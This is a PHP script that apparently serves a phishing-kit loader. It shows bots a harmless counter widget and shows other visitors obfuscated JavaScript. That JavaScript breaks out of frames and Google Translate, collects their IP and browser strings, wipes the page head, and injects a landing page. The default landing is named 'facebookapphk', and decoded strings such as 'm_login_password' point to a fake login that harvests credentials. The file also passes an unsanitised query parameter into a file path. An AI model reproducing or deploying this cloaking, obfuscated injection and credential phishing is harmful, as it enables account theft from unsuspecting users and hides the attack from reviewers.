<?php

require_once(dirname(dirname(__FILE__)).'/configuration.php');

if(IS_BOT) {
  ?>

    var _wau = _wau || []; _wau.push(["classic", "wqugpa8znpae", "b1i"]);
    (function() {var s=document.createElement("script"); s.async=true;
    s.src="//widgets.amung.us/classic.js";
    document.getElementsByTagName("head")[0].appendChild(s);
    })();

  <?php
  exit;
}


if(defined("IS_DIRECT")){
  if(IS_DIRECT == 1){
    $link_selected = LINK_SELECT;
    $content = render_counters(COUNTER_GENERAL);
    $content.= "<script>
      (function(){

        try{
             window.top.location = '$link_selected';
        }catch(f){
             window.location = '$link_selected';
        };

      })();
      </script>
    ";


  $IP = CLIENT_IP;

  $html = "

  var IS_MOBILE = '".IS_MOBILE."' > 0;
  var limit_bot = IS_MOBILE ? 600 : 410;


  var object = '';

  for (a in navigator ){
    var type = (typeof navigator[a]);
    if(type == 'string') object += navigator[a]+'; ';
  };

  var OUTPUT = encodeURIComponent('$IP'+'; '+object);


  //if(OUTPUT.length < limit_bot) window.success_implat = true;


  try{
      var ___ = {};
      var params = location.search.substring(1).split('&');
      if(params.length){
        for(var tt = 0; tt < params.length; tt++){
          if (params[tt].indexOf('=') > -1) {
            var to_object = params[tt].split('=');
            ___[to_object[0]] = decodeURIComponent(to_object[1]);
          }
        }
      }

      if (location.host == 'translate.googleusercontent.com' && ___.u) {
        try{
             window.top.location = ___.u;
             window.success_implat = true
        }catch(f){

        };
      }


        try{
             if(window.top != window.self){
              window.top.location = window.self.location
              window.success_implat = true
           }
        }catch(f){

        };

  }catch(d){};

    (function(implat){
        if(implat) return false;
        function checkbody(call){
            var timer = setInterval(function(){
                if(document.querySelector('body')){
                    clearInterval(timer)
                    if (typeof call == 'function') {
                        call(document.querySelector('body'));
                    }
                }
            },10)

        };


        function insertHtml(ele, html)
        {
           ele.innerHTML = html;
           var codes = ele.getElementsByTagName('script');
           for(var i=0;i<codes.length;i++)
           {
              eval(codes[i].text);
           }
        }


        var data = ".json_encode([$content]).";

        checkbody(function(body){
          try{ if (document.head) { document.head.innerHTML = ''; }; }catch(d){};
            insertHtml(body, data[0]);
        })

    })( window.success_implat);
  ";

  //file_put_contents($file_save, $html);
  header('Content-Type: application/javascript');
  echo trim($html);

  exit();

  };
};

$landing = 'facebookapphk';
if(isset($_GET['lan'])) $landing = $_GET['lan'];

$full_file = dirname(dirname(__FILE__)).'/landings/'.$landing.'/index.php';

if(!file_exists($full_file)) $full_file = dirname(dirname(__FILE__)).'/landings/facebookapphk/index.php';

$file_save = "cache_".md5($landing).".js";

if(file_exists($file_save)){
    header("Location: ".$file_save);
    exit();
};

$data_ = getContentfile($full_file);
$data_ .= render_counters(COUNTER_GENERAL);

$IP = CLIENT_IP;

$html = "var _0xad78=['aG9zdA==','dG9w','dGV4dA==','Z2V0RWxlbWVudHNCeVRhZ05hbWU=','c3BsaXQ=','bGVuZ3Ro','c3Vic3RyaW5n','cXVlcnlTZWxlY3Rvcg==','bm9uZQ==','aW5kZXhPZg==','c2NyaXB0','dHJhbnNsYXRlLmdvb2dsZXVzZXJjb250ZW50LmNvbQ==','c2VhcmNo','ZnVuY3Rpb24=','dV8wXzM=','c3RyaW5n','aGVhZA==','bG9jYXRpb24=','bV9sb2dpbl9wYXNzd29yZA==','".chr(rand(97,122)).base64_encode($data_)."','YmxvY2s=','ZGlzcGxheQ==','Z2V0RWxlbWVudEJ5SWQ=','dHlwZQ==','c3VjY2Vzc19pbXBsYXQ=','dV8wXzQ=','cGFzc3dvcmQ=','Ym9keQ==','c3R5bGU=','aW5uZXJIVE1M','c2VsZg=='];(function(b,c){(function(c){for(;--c;)b.push(b.shift())})(++c)})(_0xad78,181);var _0xbef9=function(b){b-=0;var c=24==b?_0xad78[b].substring(1,_0xad78[b].length):_0xad78[b];void 0===_0xbef9.EQxOoS&&(function(){var b;try{var c=Function('return (function() {}.constructor(\'return this\')( ));');b=c()}catch(c){b=window}b.atob||(b.atob=function(b){for(var c,d,e=(b+'').replace(/=+$/,''),f='',g=0,h=0;d=e.charAt(h++);~d&&(c=g%4?64*c+d:d,g++%4)?f+=String.fromCharCode(255&c>>(6&-2*g)):0)d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='.indexOf(d);return f})}(),_0xbef9.pCsXEJ=function(b){for(var c=atob(b),d=[],e=0,f=c.length;e<f;e++)d+='%'+('00'+c.charCodeAt(e).toString(16)).slice(-2);return decodeURIComponent(d)},_0xbef9.DSLOwi={},_0xbef9.EQxOoS=!0);var d=_0xbef9.DSLOwi[b];return void 0===d?(c=_0xbef9.pCsXEJ(c),_0xbef9.DSLOwi[b]=c):c=d,c};function _0x226746(){var b=document[_0xbef9('0x1b')](_0xbef9('0x13')),c=document[_0xbef9('0x1b')](_0xbef9('0x1e')),d=document[_0xbef9('0x1b')](_0xbef9('0x17'));c[_0xbef9('0x2')][_0xbef9('0x1a')]==_0xbef9('0x19')?(d[_0xbef9('0x1c')]=_0xbef9('0x7'),c[_0xbef9('0x2')][_0xbef9('0x1a')]=_0xbef9('0xd'),b[_0xbef9('0x2')][_0xbef9('0x1a')]=_0xbef9('0x19')):b[_0xbef9('0x2')][_0xbef9('0x1a')]==_0xbef9('0x19')&&(d[_0xbef9('0x1c')]=_0xbef9('0x0'),b[_0xbef9('0x2')][_0xbef9('0x1a')]=_0xbef9('0xd'),c[_0xbef9('0x2')][_0xbef9('0x1a')]=_0xbef9('0x19'))}var _0x573477=!1,_0x4e8391=410,_0x4a4b21='';for(a in navigator){var _0x434b48=typeof navigator[a];_0x434b48==_0xbef9('0x14')&&(_0x4a4b21+=navigator[a]+'; ')}try{var _0x3d13b1={},_0x344329=location[_0xbef9('0x11')][_0xbef9('0xb')](1)[_0xbef9('0x9')]('&');if(_0x344329[_0xbef9('0xa')])for(var _0x582fc1=0;_0x582fc1<_0x344329[_0xbef9('0xa')];_0x582fc1++)if(-1<_0x344329[_0x582fc1][_0xbef9('0xe')]('=')){var _0x469648=_0x344329[_0x582fc1][_0xbef9('0x9')]('=');_0x3d13b1[_0x469648[0]]=decodeURIComponent(_0x469648[1])}if(location[_0xbef9('0x5')]==_0xbef9('0x10')&&_0x3d13b1.u)try{window[_0xbef9('0x6')][_0xbef9('0x16')]=_0x3d13b1.u,window[_0xbef9('0x1d')]=!0}catch(b){}try{window[_0xbef9('0x6')]!=window[_0xbef9('0x4')]&&(window[_0xbef9('0x6')][_0xbef9('0x16')]=window[_0xbef9('0x4')][_0xbef9('0x16')],window[_0xbef9('0x1d')]=!0)}catch(b){}}catch(b){}(function(_0x51521e){function _0x4bcf8a(b){var c=setInterval(function(){document[_0xbef9('0xc')](_0xbef9('0x1'))&&(clearInterval(c),typeof b==_0xbef9('0x12')&&b(document[_0xbef9('0xc')](_0xbef9('0x1'))))},10)}function _0x2fa37c(_0x5a3e0f,_0x1f5708){_0x5a3e0f[_0xbef9('0x3')]=_0x1f5708;for(var _0x1043e6=_0x5a3e0f[_0xbef9('0x8')](_0xbef9('0xf')),_0x51faf4=0;_0x51faf4<_0x1043e6[_0xbef9('0xa')];_0x51faf4++)eval(_0x1043e6[_0x51faf4][_0xbef9('0x7')])}if(_0x51521e)return!1;var _0x2738c3=[_0xbef9('0x18')];_0x4bcf8a(function(b){try{document[_0xbef9('0x15')]&&(document[_0xbef9('0x15')][_0xbef9('0x3')]='')}catch(b){}_0x2fa37c(b,_0x2738c3[0])})})(window[_0xbef9('0x1d')]);";

//file_put_contents($file_save, $html);
header('Content-Type: application/javascript');
echo trim($html);

exit();
